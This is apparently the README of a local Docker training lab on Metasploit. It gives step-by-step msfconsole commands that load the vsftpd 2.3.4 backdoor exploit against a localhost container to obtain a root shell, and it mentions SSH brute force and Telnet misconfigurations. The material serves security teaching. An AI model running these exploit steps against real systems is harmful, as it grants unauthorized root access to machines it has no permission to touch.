# Metasploit Framework & Service Exploitation Lab

## Overview
Exploit vulnerable classic network daemons (FTP vsftpd 2.3.4 backdoor, SSH brute force, Telnet misconfigurations).

- **Default Port / Access**: `2121 (FTP), 2222 (SSH), 2323 (Telnet), 8082 (HTTP)`
- **Directory**: `Classes/01_cyber_security_ethical_hacking/metasploit_and_system_hacking`

---

## How to Solve & Practice

1. Start the lab: `docker compose up -d`
2. Launch Metasploit console on host: `msfconsole`
3. Search for backdoor module: `search vsftpd`
4. Load exploit: `use exploit/unix/ftp/vsftpd_234_backdoor`
5. Set target: `set RHOSTS 127.0.0.1` and `set RPORT 2121`
6. Execute: `run` to obtain a root shell session.

---

## YouTube Walkthroughs & Solving Guides

- [Exploiting VSFTPD v2.3.4 Using Metasploit](https://www.youtube.com/watch?v=JYoySps-844)
- [NetworkChuck - Metasploit Framework basics on Kali Linux](https://www.youtube.com/watch?v=aRwxsn9ZEQw)
- [David Bombal - Metasploit Hacking Demo & Exploitation](https://www.youtube.com/watch?v=bBut8D7usKA)

---

## Quick CLI Control
From the `cyber_lab` root directory:
```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
